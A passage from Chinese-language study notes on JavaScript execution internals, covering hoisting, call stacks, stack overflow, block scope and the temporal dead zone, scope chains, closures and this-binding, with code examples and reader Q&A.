\u0026#34;极客时间\u0026#34;, showName -\u0026gt;function : {console.log(myname) 以上就是一段代码的编译和执行流程。实际上，编译阶段和执行阶段都是非常复杂的，包括了词法分析、语法解析、代码优化、代码生成等。\n代码中出现相同的变量或者函数\n在执行一段 JavaScript 代码之前，会编译代码，并将代码中的函数和变量保存到执行上下文的变量环境中，那么如果代码中出现了重名的函数或者变量，JavaScript 引擎会如何处理？\n1 2 3 4 5 6 7 8 function showName() { console.log(\u0026#34;极客邦\u0026#34;); } showName(); function showName() { console.log(\u0026#34;极客时间\u0026#34;); } showName(); 完整执行流程：\n首先是编译阶段。遇到第一个 showName 函数，会将该函数体存放在堆中，并创建一个变量存放到变量环境中指向堆中函数体存在的地址。接下来是第二个 showName 函数，将该函数体存放在堆中，继续将该函数地址存放至变量环境中的变量上，但是变量环境中已经存在一个 showName 函数了，此时，第二个 showName 函数在堆中的地址会将第一个 showName 函数的地址覆盖掉。这样变量环境中就只存在第二个 showName 函数的地址了。 接下来是执行阶段。先执行第一个 showName 函数，但由于是从变量环境中查找 showName 函数，而变量环境中保存的 showName 变量指向第二个函数在堆中的地址，所以最终调用的是第二个函数，打印的内容是“极客时间”。第二次执行 showName 函数也是走同样的流程，所以输出的结果也是“极客时间”。 总结：\nJavaScript 代码执行过程中，会在编译阶段进行变量提升，变量和函数会被存放到变量环境中，变量的默认值会被设置为 undefined；在代码执行阶段，JavaScript 引擎会从变量环境中去查找自定义的变量和函数。 如果在编译阶段，存在两个相同的函数，那么最终存放在变量环境中的是最后定义的那个，这是因为后定义的会覆盖掉之前定义的。 JavaScript 的执行机制：先编译，再执行。\n下面是关于同名变量和函数的两点处理原则：\n如果是同名的函数，JavaScript 编译阶段会选择最后声明的那个。\n如果变量和函数同名，那么在编译阶段，变量的声明会被忽略。\n1 2 3 4 5 6 7 console.log(fn); function fn() { console.log(123); } var fn = \u0026#34;abc\u0026#34;; // 打印结果是 函数 函数提升要比变量提升的优先级要高一些，且不会被变量声明覆盖，但是会被变量在执行阶段的赋值覆盖。\n1 2 3 4 5 6 7 8 9 10 debugger; (function () { console.log(g); if (true) { console.log(\u0026#34;hello world\u0026#34;); function g() { return true; } } })(); 这个函数调试时，发现打印 g 时值是 undefined 而不是提示 not defined，说明 if 中 g 函数确实是提升了，但是为何不是 g()而是 undefined？然后走完 function g(){ return true; }这一步后 console.log(g)中的 g 才变为 g()。这里条件声明函数的变量提升有点搞不明白。\nES 规定函数是不能在块级作用域中声明， function foo(){ if(true){ console.log('hello world'); function g(){ return true; } } } 也就是说，上面这行代码执行会报错，但是个大浏览器都没有遵守这个标准。\nES6 明确支持块级作用域，ES6 规定块级作用域内部声明的函数，和通过 let 声明变量的行为类似。\n规定的是理想的，但是还要照顾实现，要是完全按照 let 的方式来修订，会影响到以前老的代码，所以为了向下兼容，个大浏览器基本是按照下面的方式来实现的：\nfunction foo(){ if(true){ console.log('hello world'); var g = function(){return true;}\n} }\n这就解释了你的疑问，不过还是不建议在块级作用域中定义函数，很多时候，简单的才是最好的。\nlexical scope 发生在编译阶段，会产生变量提升的效果； JavaScript 的 Dynamic Scope 发生在执行阶段，会产生 this binding, prototype chaining search 的过程；变量提升只提升声明(left hand）不提升赋值(right hand) function 的声明主要有: function declaration, function expression 其中 function declaration 会将方法体也提升，而 function expression 同变量提升一样，只会提升声明；变量提升在有 let 或者 const 的 block 中会出现 Temporal Dead Zone Error, 效果好似没有提升；另外要注意 block 内部的 var 变量能够穿透 block 提升到 global scope.\n更多 JS 请了解： https://geekeast.github.io/jsscope.html\n一段 javascript 代码进入编译阶段是会对函数体内的代码也进行编译，还是只是将函数体的代码存储在堆，在执行中遇到该函数再去编译？\n函数只有在调用的时候才会被编译。\n1 2 3 4 function func() { let a = 10; var a = 1; } 上面的代码中，func 没有执行，引擎依然会报语法错误所以没有执行的代码也会编译的，这里应该是预编译的时候检查出的错误\njs 执行分三步：1.语法分析，2.预编译，3.执行，你这是发生在语法分析上。\n调用栈 当一段代码被执行时，JavaScript 引擎先会对其进行编译，并创建执行上下文。（并不是任意一段代码都能产生执行上下文的。）但是并没有明确说明到底什么样的一段代码才会产生执行上下文？\n哪些情况下代码才算是“一段”代码，才会在执行之前就进行编译并创建执行上下文。一般说来，有这么三种情况：\n当 JavaScript 执行全局代码的时候，会编译全局代码并创建全局执行上下文，而且在整个页面的生存周期内，全局执行上下文只有一份。 当调用一个函数的时候，函数体内的代码会被编译，并创建函数执行上下文，一般情况下，函数执行结束之后，创建的函数执行上下文会被销毁。 当使用 eval 函数时，eval 的代码也会被编译，并创建执行上下文。 栈溢出的错误，如下图所示：\n这种错误涉及到调用栈。 JavaScript 中有很多函数，经常会出现一个函数中调用另外一个函数的情况，调用栈就是用来管理函数调用关系的一种数据结构。\n函数调用 1 2 3 4 5 6 var a = 2; function add() { var b = 10; return a + b; } add(); 编译阶段，JavaScript 引擎会为上面这段代码创建全局执行上下文，包含了声明的函数和变量，可以参考下图：\n从图中可以看出，代码中全局变量和函数都保存在全局上下文的变量环境中。\n执行上下文准备好之后，便开始执行全局代码，当执行到 add 时，JavaScript 判断这是一个函数调用，那么将编译执行以下操作：\n首先，从全局执行上下文中找到 add 函数在堆中的位置，取出 add 函数代码。 其次，对 add 函数的这段代码进行编译，并创建该函数的执行上下文和可执行代码。 最后，执行阶段执行代码，输出结果。 当执行到 add 函数时，有两个执行上下文了——全局执行上下文和 add 函数的执行上下文。\n在执行 JavaScript 时，可能会存在多个执行上下文，那么 JavaScript 引擎是如何管理这些执行上下文的？\n答案是通过一种叫栈的数据结构来管理的。那什么是栈呢？它又是如何管理这些执行上下文呢？\n栈 JavaScript 的调用栈 JavaScript 引擎正是利用栈的这种结构来管理执行上下文的。在执行上下文创建好后，JavaScript 引擎会将执行上下文压入栈中，通常把这种用来管理执行上下文的栈称为执行上下文栈，又称调用栈。\n1 2 3 4 5 6 7 8 9 10 var a = 2; function add(b, c) { return b + c; } function addAll(b, c) { var d = 10; var result = add(b, c); return a + result + d; } addAll(3, 6); 下面就一步步地分析在代码的执行过程中，调用栈的状态变化情况。\n第一步，创建全局上下文，并将其压入栈底。如下图所示：\n变量 a、函数 add 和 addAll 都保存到了全局上下文的变量环境对象中。\n全局执行上下文压入到调用栈后，JavaScript 引擎便开始执行全局代码。首先会执行 a=2 的赋值操作，执行该语句会将全局上下文变量环境中 a 的值设置为 2。设置后的全局上下文的状态如下图所示：\n第二步是调用 addAll 函数。当调用该函数时，JavaScript 引擎会编译该函数，并为其创建一个执行上下文，最后还将该函数的执行上下文压入栈中，如下图所示：\naddAll 函数的执行上下文创建好之后，便进入了函数代码的执行阶段，这里先执行的是 d=10 的赋值操作，执行语句会将 addAll 函数执行上下文中的 d 由 undefined 变成了 10。\n然后接着往下执行，第三步，当执行到 add 函数调用语句时，同样会为其创建执行上下文，并将其压入调用栈，如下图所示：\n当 add 函数返回时，该函数的执行上下文就会从栈顶弹出，并将 result 的值设置为 add 函数的返回值，也就是 9。如下图所示：\n紧接着 addAll 执行最后一个相加操作后并返回，addAll 的执行上下文也会从栈顶部弹出，此时调用栈中就只剩下全局上下文了。最终如下图所示：\n至此，整个 JavaScript 流程执行结束。\n调用栈是 JavaScript 引擎追踪函数执行顺序的一个机制，当一次有多个函数被调用时，通过调用栈就能够追踪到哪个函数正在被执行以及各函数之间的调用关系。\n利用好调用栈 如何利用浏览器查看调用栈的信息 当执行一段复杂的代码时，可能很难从代码文件中分析其调用关系，这时候可以在想要查看的函数中加入断点，然后当执行到该函数时，就可以查看该函数的调用栈了。\n可以打开“开发者工具”，点击“Source”标签，选择 JavaScript 代码的页面，然后在第 3 行加上断点，并刷新页面。可以看到执行到 add 函数时，执行流程就暂停了，这时可以通过右边“call stack”来查看当前的调用栈的情况，如下图：\n从图中可以看出，右边的“call stack”下面显示出来了函数的调用关系：栈的最底部是 anonymous，也就是全局的函数入口；中间是 addAll 函数；顶部是 add 函数。这就清晰地反映了函数的调用关系，所以在分析复杂结构代码，或者检查 Bug 时，调用栈都是非常有用的。\n除了通过断点来查看调用栈，你还可以使用 console.trace() 来输出当前的函数调用关系，比如在示例代码中的 add 函数里面加上了 console.trace()，你就可以看到控制台输出的结果，如下图：\n栈溢出（Stack Overflow） 调用栈是有大小的，当入栈的执行上下文超过一定数目，JavaScript 引擎就会报错，把这种错误叫做栈溢出。\n1 2 3 4 function division(a, b) { return division(a, b); } console.log(division(1, 2)); 当执行时，就会抛出栈溢出错误，如下图：\n抛出的错误信息为：超过了最大栈调用大小（Maximum call stack size exceeded）。\n当 JavaScript 引擎开始执行这段代码时，它首先调用函数 division，并创建执行上下文，压入栈中；然而，这个函数是递归的，并且没有任何终止条件，所以它会一直创建新的函数执行上下文，并反复将其压入栈中，但栈是有容量限制的，超过最大数量后就会出现栈溢出的错误。\n理解了栈溢出原因后，可以使用一些方法来避免或者解决栈溢出的问题，比如把递归调用的形式改造成其他形式（循环），或者使用加入定时器的方法来把当前任务拆分为其他很多小任务。\n1 2 3 4 5 function runStack(n) { if (n === 0) return 100; return runStack(n - 2); } runStack(50000); 这是一段递归代码，可以通过传入参数 n，让代码递归执行 n 次，也就意味着调用栈的深度能达到 n，当输入一个较大的数时，比如 50000，就会出现栈溢出的问题，那么你能优化下这段代码，以解决栈溢出的问题吗？\n答案：\n1 2 3 4 5 6 7 8 // 不进栈，就不会栈溢出了 function runStack(n) { if (n === 0) return 100; return setTimeout(function () { runStack(n - 2); }, 0); } runStack(50000); 老师题目中的递归本身就是在函数尾部递归，如果浏览器或者 node 等宿主环境实现了对尾部递归进行优化的话，那么就不会出现栈溢出的情况，我在 mac node 环境下试了下，老师的代码还是栈溢出了，这就说明我电脑的宿主环境没有对尾递归进行优化。\n1 2 3 4 5 6 function runStack(n){ while(true){ if(n===0) return 100 n = n-2 } } 算法经典思想：循环消除尾递归\n疑问：调用栈是后进先出，那么当存在闭包时，某个函数的执行上下文还存在，那么其他函数的出栈是否受影响？\n回答：执行上下文已经没了，只不过内部函数引用的变量还保存在堆上，所以不影响栈的操作。\n块级作用域 由于 JavaScript 存在变量提升，从而导致了很多与直觉不符的代码，这也是 JavaScript 的一个重要设计缺陷，其他语言没有。\nES6 通过引入块级作用域并配合 let、const 关键字，来避开了这种设计缺陷，但是由于 JavaScript 需要保持向下兼容，所以变量提升在相当长一段时间内还会继续存在。\n为什么在 JavaScript 中会存在变量提升，以及变量提升所带来的问题。\n作用域（scope） 作用域是指在程序中定义变量的区域，该区域决定了变量的生命周期。通俗地理解，作用域就是变量与函数的可访问范围，即作用域控制着变量和函数的可见性和生命周期。\n在 ES6 之前，ES 的作用域只有两种：全局作用域和函数作用域。\n全局作用域中的对象在代码中的任何地方都能访问，其生命周期伴随着页面的生命周期。 函数作用域就是在函数内部定义的变量或者函数，并且定义的变量或者函数只能在函数内部被访问。函数执行结束之后，函数内部定义的变量会被销毁。 在 ES6 之前，JavaScript 只支持这两种作用域，相较而言，其他语言则都普遍支持块级作用域。块级作用域就是使用一对大括号包裹的一段代码，比如函数、判断语句、循环语句，甚至单独的一个{}都可以被看作是一个块级作用域。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //if块 if (1) { } //while块 while (1) {} //函数块 function foo() {} //for循环块 for (let i = 0; i \u0026lt; 100; i++) {} //单独一个块 { } 如果一种语言支持块级作用域，那么其代码块内部定义的变量在代码块外部是访问不到的，并且等该代码块中的代码执行完成之后，代码块中定义的变量会被销毁。\n和 Java、C/C++ 不同，ES6 之前是不支持块级作用域的，因为当初设计这门语言的时候，并没有想到 JavaScript 会火起来，所以只是按照最简单的方式来设计。没有块级作用域，再把作用域内部的变量统一提升无疑是最快速、最简单的设计，不过这也直接导致了函数中的变量无论是在哪里声明的，在编译阶段都会被提取到执行上下文的变量环境中，所以这些变量在整个函数体内部的任何地方都是能被访问的，这也就是 JavaScript 中的变量提升。\n变量提升所带来的问题 由于变量提升作用，使用 JavaScript 来编写和其他语言相同逻辑的代码，都有可能会导致不一样的执行结果。那为什么会出现这种情况呢？主要有以下两种原因。\n变量容易在不被察觉的情况下被覆盖掉 本应销毁的变量没有被销毁 在函数的执行过程当中，js 会优先在当前的执行上下文中查找变量。\n如何通过块级作用域并配合 let 和 const 关键字来修复这种缺陷。\nlet 关键字是支持块级作用域的，所以在编译阶段，JavaScript 引擎并不会把 if 块中通过 let 声明的变量存放到变量环境中，这也就意味着在 if 块通过 let 声明的关键字，并不会提升到全函数可见。（let 关键字支持块级作用域，所以在编译阶段，JavaScript 引擎并不会把块级作用域中的通过 let 声明的变量存放在变量环境中，这也就意味着在块级作用域中通过通过 let 声明的关键字并不会提升到全函数中可见。）\nJavaScript 是如何支持块级作用域的 在同一段代码中，ES6 是如何做到既要支持变量提升的特性，又要支持块级作用域的呢？\n站在执行上下文的角度来回答。\nJavaScript 引擎是通过变量环境对象实现函数级作用域的，那么 ES6 又是如何在函数级作用域的基础之上，实现对块级作用域的支持呢？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function foo() { var a = 1; let b = 2; { let b = 3; var c = 4; let d = 5; console.log(a); console.log(b); } console.log(b); console.log(c); console.log(d); } foo(); 当执行上面这段代码的时候，JavaScript 引擎会先对其进行编译并创建执行上下文，然后再按照顺序执行代码，关于如何创建执行上下文我们在前面的文章中已经分析过了，但是现在的情况有点不一样，引入了 let 关键字，let 关键字会创建块级作用域，那么 let 关键字是如何影响执行上下文的呢？\n上面这段代码的执行流程\n第一步是编译并创建执行上下文，下面是 foo 的执行上下文示意图：\n通过上图，可以得出以下结论：\n函数内部通过 var 声明的变量，在编译阶段全都被存放到变量环境里面了。 通过 let 声明的变量，在编译阶段会被存放到词法环境（Lexical Environment）中，只提升创建不提升初始化，也就有了暂时性死区。 在函数内部的作用域块中的其他块级作用里，通过 let 声明的变量并没有被存放到词法环境中。 接下来，第二步继续执行代码，当执行到代码块里面时，变量环境中 a 的值已经被设置成了 1，词法环境中 b 的值已经被设置成了 2，这时候函数的执行上下文就如下图所示：\n从图中可以看出，当执行流程进入函数内部并开始执行块级作用域代码时，作用域块中通过 let 声明的变量，会被存放在词法环境的一个单独的区域中，这个区域中的变量并不影响作用域块外面的变量，比如在作用域外面声明了变量 b，在该作用域块内部也声明了变量 b，当执行到作用域内部时，它们都是独立的存在。\n其实，在词法环境内部，维护了一个小型栈结构，栈底是函数最外层的词法变量环境，进入一个块级作用域后，就会把该块级作用域内部的词法变量环境压到栈顶；当块级作用域执行完成之后，该块级作用域的词法变量环境就会从栈顶弹出，这就是词法环境的结构。\n再接下来，当执行到块级作用域中的 console.log(a)这行代码时，就需要在词法环境和变量环境中查找变量 a 的值了，具体查找方式是：沿着词法环境的栈顶向下查询，如果在词法环境中的某个块中查找到了，就直接返回给 JavaScript 引擎，如果没有查找到，那么继续在变量环境中查找。\n这样一个变量查找过程就完成了，你可以参考下图：\n从上图你可以清晰地看出变量查找流程，不过要完整理解查找变量或者查找函数的流程，就涉及到作用域链了。\n当作用域块执行结束之后，其内部定义的变量就会从词法环境的栈顶弹出，最终执行上下文如下图所示：\n理解词法环境的结构和工作机制，块级作用域就是通过词法环境的栈结构来实现的，而变量提升是通过变量环境来实现，通过这两者的结合，JavaScript 引擎也就同时支持了变量提升和块级作用域了。\n每种语言其实都是在相互借鉴对方的优势，协同进化，比如 JavaScript 引进了块级作用域、迭代器和协程，其底层虚拟机的实现和 Java、Python 又是非常相似，也就是说如果你理解了 JavaScript 协程和 JavaScript 中的虚拟机，其实你也就理解了 Java、Python 中的协程和虚拟机的实现机制。\n问题：\n1 2 3 4 5 let myname = \u0026#34;极客时间\u0026#34;; { console.log(myname); let myname = \u0026#34;极客邦\u0026#34;; } 回答：\n1 2 3 4 5 6 7 【最终打印结果】：VM6277:3 Uncaught ReferenceError: Cannot access \u0026#39;myname\u0026#39; before initialization 【分析原因】：在块级作用域内，let声明的变量被提升，但变量只是创建被提升，初始化并没有被提升，在初始化之前使用变量，就会形成一个暂时性死区。 【拓展】 var的创建和初始化被提升，赋值不会被提升。 let的创建被提升，初始化和赋值不会被提升。 function的创建、初始化和赋值均会被提升。 (应该是分创建，初始化，赋值三个步骤，不然按照文章提到的变量从词法环境到变量环境的查询方向，理论上还是可以打印出myname。正因为let没有初始化，所以暂时性死区中使用变量就会报错) 问题：有一个疑问，在 abcd 那个例子里，第一步\u0026lt;编译并创建执行上下文\u0026gt;的图里并没有块级作用域的 b=undefined; d=undefined。而在第二步里\u0026lt;继续执行代码\u0026gt;的图中才出现 b=undefined; d=undefined。想问下这个块级作用域的 b=undefined; d=undefined 是不是应该在第一步的编译阶段里就有。还是说在执行阶段像函数那样，块级作用域会有一个自己的编译阶段。\n1 作者回复: 执行函数时才进行编译，抽象语法树(AST）在进入函数阶段就生成了，并且函数内部作用域是已经明确了，所以进入块级作用域不会有编译过程，只不过通过let或者const声明的变量会在进入块级作用域的时被创建，但是在该变量没有赋值之前，引用该变量JavaScript引擎会抛出错误---这就是“暂时性死区” 问题：有个问题，在一个块级作用域中，let 和 const 声明的变量是在编译阶段被压入栈中还是执行阶段被压入栈中？在文中的表述来看，第一个 let 声明的变量是在编译阶段就压入栈中的，但是后面的变量又感觉是在执行是压入栈中。\n1 2 3 4 5 作者回复: 对的，你的理解没错 函数只会在第一次执行的时候被编译，所以编译时变量环境和词法环境最顶层数据已经确定了。 当执行到块级作用域的时候，块级作用域中通过let和const申明的变量会被追加到词法环境中，当这个块执行结束之后，追加到词法作用域的内容又会销毁掉。 问题：看得很生气，全篇文章不提变量的「创建」「初始化」「赋值」这三种区别，把创建和初始化揉在一起了，也是看了精选留言里第一条评论之后 Google 才查找到，否则刚开始我真的不理解为啥都已经在词法环境找到了变量却报错了！按照这种理论的话，是否说明词法环境只有变量，并没有等于 undefined？\n1 2 3 4 5 6 7 8 9 10 这一节主要是将var和let的区别以及底层实现机制的，我看你的疑问是下面这个问题： function test(){ console.log(a) let a = 7; } test() 执行test的时候，编译阶段a已经在内存中，为什么提前访问不了？ 这主要是因为V8虚拟机做了限制，虽然a在内存中，但是当你在let a 之前访问a时，根据ECMAScript定义，虚拟机会阻止的访问！ 作用域链和闭包 什么是作用域，以及 ES6 是通过变量环境和词法环境来同时支持变量提升和块级作用域，如何通过词法环境和变量环境来查找变量。\n什么是作用域链，什么是闭包。\n1 2 3 4 5 6 7 8 9 10 function bar() { console.log(myName); } function foo() { var myName = \u0026#34;极客邦\u0026#34;; bar(); console.log(myName); } var myName = \u0026#34;极客时间\u0026#34;; foo(); 通过执行上下文来分析代码的执行流程\n按照调用栈的顺序来查找变量，查找方式如下：\n先查找栈顶是否存在 myName 变量，但是这里没有，所以接着往下查找 foo 函数中的变量。 在 foo 函数中查找到了 myName 变量，这时候就使用 foo 函数中的 myName。 如果按照这种方式来查找变量，那么最终执行 bar 函数打印出来的结果就应该是“极客邦”，但打印出来的结果是“极客时间”。\n作用域链 在每个执行上下文的变量环境中，都包含了一个外部引用，用来指向外部的执行上下文，把这个外部引用称为 outer。\n当一段代码使用了一个变量时，JavaScript 引擎首先会在“当前的执行上下文”中查找该变量，比如上面那段代码在查找 myName 变量时，如果在当前的变量环境中没有查找到，那么 JavaScript 引擎会继续在 outer 所指向的执行上下文中查找。\n从图中可以看出，bar 函数和 foo 函数的 outer 都是指向全局上下文的，这也就意味着如果在 bar 函数或者 foo 函数中使用了外部变量，那么 JavaScript 引擎会去全局执行上下文中查找。把这个查找的链条就称为作用域链。\n变量是通过作用域链来查找的，但 foo 函数调用的 bar 函数，那为什么 bar 函数的外部引用是全局执行上下文，而不是 foo 函数的执行上下文？\n这是因为在 JavaScript 执行过程中，其作用域链是由词法作用域决定的。\n词法作用域 词法作用域就是指作用域是由代码中函数声明的位置来决定的，所以词法作用域是静态的作用域，通过它就能够预测代码在执行过程中如何查找标识符。\n从图中可以看出，词法作用域就是根据代码的位置来决定的，因为 JavaScript 作用域链是由词法作用域决定的，所以整个词法作用域链的顺序是：foo 函数作用域—\u0026gt;bar 函数作用域—\u0026gt;main 函数作用域—\u0026gt; 全局作用域。\n在开头那段代码中，foo 函数调用了 bar 函数，那为什么 bar 函数的外部引用是全局执行上下文，而不是 foo 函数的执行上下文?\n这是因为根据词法作用域，定义这两个函数时， foo 和 bar 的上级作用域都是全局作用域，所以如果 foo 或者 bar 函数使用了一个它们没有定义的变量，那么它们会到全局作用域去查找。也就是说，词法作用域是代码编译阶段就决定好的，和函数是怎么调用的没有关系。\n块级作用域中的变量查找 涉及块级作用域中变量是如何查找的？在编写代码的时候，如果使用了一个在当前作用域中不存在的变量，这时 JavaScript 引擎就需要按照作用域链在其他作用域中查找该变量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 function bar() { var myName = \u0026#34;极客世界\u0026#34;; let test1 = 100; if (1) { let myName = \u0026#34;Chrome浏览器\u0026#34;; console.log(test); } } function foo() { var myName = \u0026#34;极客邦\u0026#34;; let test = 2; { let test = 3; bar(); } } var myName = \u0026#34;极客时间\u0026#34;; let myAge = 10; let test = 1; foo(); 在作用域链和词法环境的角度来分析下其执行过程。\nES6 是支持块级作用域的，当执行到代码块时，如果代码块中有 let 或者 const 声明的变量，那么变量就会存放到该函数的词法环境中。对于上面这段代码，当执行到 bar 函数内部的 if 语句块时，其调用栈的情况如下图所示：\n执行到 bar 函数的 if 语块之内，需要打印出来变量 test，那么就需要查找到 test 变量的值，其查找过程已经在上图中使用序号 1、2、3、4、5 标记出来。\n首先是在 bar 函数的执行上下文中查找，但因为 bar 函数的执行上下文中没有定义 test 变量，所以根据词法作用域的规则，下一步就在 bar 函数的外部作用域中查找，也就是全局作用域。在某个执行上下文中，查找某个遍历的过程是从此法环境调用栈的栈顶开始依次向栈底开始查找，一旦找到就停止查找并返回，如果没有找到就继续转而去该上下文中变量环境中查找，找到就返回。找不到就沿着作用域链往上找，直到都找不到是报错。\n闭包 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function foo() { var myName = \u0026#34;极客时间\u0026#34;; let test1 = 1; const test2 = 2; var innerBar = { getName: function () { console.log(test1); return myName; }, setName: function (newName) { myName = newName; }, }; return innerBar; } var bar = foo(); bar.setName(\u0026#34;极客邦\u0026#34;); bar.getName(); console.log(bar.getName()); 当执行到 foo 函数内部的 return innerBar 这行代码时调用栈的情况，可以参考下图：\n从上面的代码可以看出，innerBar 是一个对象，包含了 getName 和 setName 的两个方法（通常把对象内部的函数称为方法）。这两个方法都是在 foo 函数内部定义的，并且这两个方法内部分别使用了 myName 和 test1 两个变量。\n根据词法作用域的规则，内部函数 getName 和 setName 总是可以访问它们的外部函数 foo 中的变量，所以当 innerBar 对象返回给全局变量 bar 时，虽然 foo 函数已经执行结束，但是 getName 和 setName 函数依然可以使用 foo 函数中的变量 myName 和 test1。所以当 foo 函数执行完成之后，其整个调用栈的状态如下图所示：\n从上图可以看出，foo 函数执行完成之后，其执行上下文从栈顶弹出了，但是由于返回的 setName 和 getName 方法中使用了 foo 函数内部的变量 myName 和 test1，所以这两个变量依然保存在内存中。\n除了 setName 和 getName 函数之外，其他任何地方都是无法访问该闭包中的变量，就可以把这个包称为 foo 函数的闭包。\n在 JavaScript 中，根据词法作用域的规则，内部函数总是可以访问其外部函数中声明的变量，当通过调用一个外部函数返回一个内部函数后，即使该外部函数已经执行结束了，但是内部函数引用外部函数的变量依然保存在内存中，我们就把这些变量的集合称为闭包。比如外部函数是 foo，那么这些变量的集合就称为 foo 函数的闭包。\n当执行到 bar.setName 方法中的 myName = \u0026ldquo;极客邦\u0026quot;这句代码时，JavaScript 引擎会沿着“当前执行上下文–\u0026gt;foo 函数闭包–\u0026gt; 全局执行上下文”的顺序来查找 myName 变量，可以参考下面的调用栈状态图：\n从图中可以看出，setName 的执行上下文中没有 myName 变量，foo 函数的闭包中包含了变量 myName，所以调用 setName 时，会修改 foo 闭包中的 myName 变量的值。当调用 bar.getName 的时候，所访问的变量 myName 也是位于 foo 函数闭包中的。\n也可以通过“开发者工具”来看看闭包的情况，打开 Chrome 的“开发者工具”，在 bar 函数任意地方打上断点，然后刷新页面，可以看到如下内容：\n从图中可以看出来，当调用 bar.getName 的时候，右边 Scope 项就体现出了作用域链的情况：Local 就是当前的 getName 函数的作用域，Closure(foo) 是指 foo 函数的闭包，最下面的 Global 就是指全局作用域，从“Local–\u0026gt;Closure(foo)–\u0026gt;Global”就是一个完整的作用域链。\n以后也可以通过 Scope 来查看实际代码作用域链的情况。\n闭包是怎么回收的 闭包的销毁。如果闭包使用不正确，会很容易造成内存泄漏的。\n通常，如果引用闭包的函数是一个全局变量，那么闭包会一直存在直到页面关闭；但如果这个闭包以后不再使用的话，就会造成内存泄漏。\n如果引用闭包的函数是个局部变量，等函数销毁后，在下次 JavaScript 引擎执行垃圾回收时，判断闭包这块内容如果已经不再被使用了，那么 JavaScript 引擎的垃圾回收器就会回收这块内存。\n所以在使用闭包的时候，尽量注意一个原则：如果该闭包会一直使用，那么它可以作为全局变量而存在；但如果使用频率不高，而且占用内存又比较大的话，那就尽量让它成为一个局部变量。\n问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var bar = { myName: \u0026#34;time.geekbang.com\u0026#34;, printName: function () { console.log(myName); }, }; function foo() { let myName = \u0026#34;极客时间\u0026#34;; return bar.printName; } let myName = \u0026#34;极客邦\u0026#34;; let _printName = foo(); _printName(); bar.printName(); 在上面这段代码中有三个地方定义了 myName，分析这段代码，你觉得这段代码在执行过程中会产生闭包吗？最终打印的结果是什么？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 var bar = { myName:\u0026#34;time.geekbang.com\u0026#34;, printName: function () { console.log(myName) } } function foo() { let myName = \u0026#34; 极客时间 \u0026#34; return bar.printName } let myName = \u0026#34; 极客邦 \u0026#34; let _printName = foo() _printName() bar.printName() 全局执行上下文： 变量环境： Bar=undefined Foo= function outer=null 词法环境： myname = undefined _printName = undefined 开始执行： bar ={myname: \u0026#34;time.geekbang.com\u0026#34;, printName: function(){...}} myName = \u0026#34; 极客邦 \u0026#34; _printName = foo() 调用foo函数，压执行上下文入调用栈 foo函数执行上下文： 变量环境： 空,outer 词法环境： myName=undefined 开始执行： myName = \u0026#34; 极客时间 \u0026#34; return bar.printName 开始查询变量bar， 查找当前词法环境（没有）-\u0026gt;查找当前变量环境（没有） -\u0026gt; 查找outer词法环境（没有）-\u0026gt; 查找outer变量环境（找到了）并且返回找到的值 pop foo的执行上下文 _printName = bar.printName printName（）压bar.printName方法的执行上下文入调用栈 bar.printName函数执行上下文： 变量环境： 空 词法环境： 空 开始执行： console.log(myName) 开始查询变量myName， 查找当前词法环境（没有）-\u0026gt;查找当前变量环境（没有） -\u0026gt; 查找outer词法环境（找到了） 打印\u0026#34; 极客邦 \u0026#34; pop bar.printName的执行上下文 bar.printName() 压bar.printName方法的执行上下文入调用栈 bar.printName函数执行上下文： 变量环境： 空 词法环境： 空 开始执行： console.log(myName) 开始查询变量myName， 查找当前词法环境（没有）-\u0026gt;查找当前变量环境（没有） -\u0026gt; 查找outer词法环境（找到了） 打印\u0026#34;极客邦\u0026#34; pop bar.printName的执行上下文 思考题： 这道题其实是个障眼法，只需要确定好函数调用栈就可以很轻松的解答，调用了foo()后，返回的是bar.printName，后续就跟foo函数没有关系了，所以结果就是调用了两次bar.printName()，根据词法作用域，结果都是“极客邦”，也不会形成闭包。 闭包还可以这样理解：当函数嵌套时，内层函数引用了外层函数作用域下的变量，并且内层函数在全局作用域下可访问时，就形成了闭包。 this 在对象内部的方法中使用对象内部的属性是一个非常普遍的需求。但是 JavaScript 的作用域机制并不支持这一点，基于这个需求，JavaScript 又搞出来另外一套 this 机制。\n作用域链和 this 是两套不同的系统，它们之间基本没太多联系。\n执行上下文中包含了变量环境、词法环境、外部环境，还有一个 this。\nthis 是和执行上下文绑定的，也就是说每个执行上下文中都有一个 this。\n执行上下文主要分为三种——全局执行上下文、函数执行上下文和 eval 执行上下文，所以对应的 this 也只有这三种——全局执行上下文中的 this、函数中的 this 和 eval 中的 this。\n全局执行上下文中的 this 全局执行上下文中的 this 是指向 window 对象的。这也是 this 和作用域链的唯一交点，作用域链的最底端包含了 window 对象，全局执行上下文中的 this 也是指向 window 对象。\n函数执行上下文中的 this 1 2 3 4 function foo() { console.log(this); } foo(); 默认情况下调用一个函数，其执行上下文中的 this 也是指向 window 对象的。\n设置函数执行上下文中的 this 值:\n通过函数的 call 方法设置\n1 2 3 4 5 6 7 8 9 10 let bar = { myName: \u0026#34;极客邦\u0026#34;, test1: 1, }; function foo() { this.myName = \u0026#34;极客时间\u0026#34;; } foo.call(bar); console.log(bar); console.log(myName); 除了 call 方法，还可以使用 bind 和 apply 方法来设置函数执行上下文中的 this。\n通过对象调用方法设置\n1 2 3 4 5 6 7 var myObj = { name: \u0026#34;极客时间\u0026#34;, showThis: function () { console.log(this); }, }; myObj.showThis(); 使用对象来调用其内部的一个方法，该方法的 this 是指向对象本身的。\n1 2 3 4 5 6 7 8 9 var myObj = { name: \u0026#34;极客时间\u0026#34;, showThis: function () { this.name = \u0026#34;极客邦\u0026#34;; console.log(this); }, }; var foo = myObj.showThis; foo(); 在全局环境中调用一个函数，函数内部的 this 指向的是全局变量 window。 通过一个对象来调用其内部的一个方法，该方法的执行上下文中的 this 指向对象本身。 通过构造函数中设置\n1 2 3 4 function CreateObj() { this.name = \u0026#34;极客时间\u0026#34;; } var myObj = new CreateObj(); 使用 new 创建对象\nnew\n当执行 new CreateObj() 的时候，JavaScript 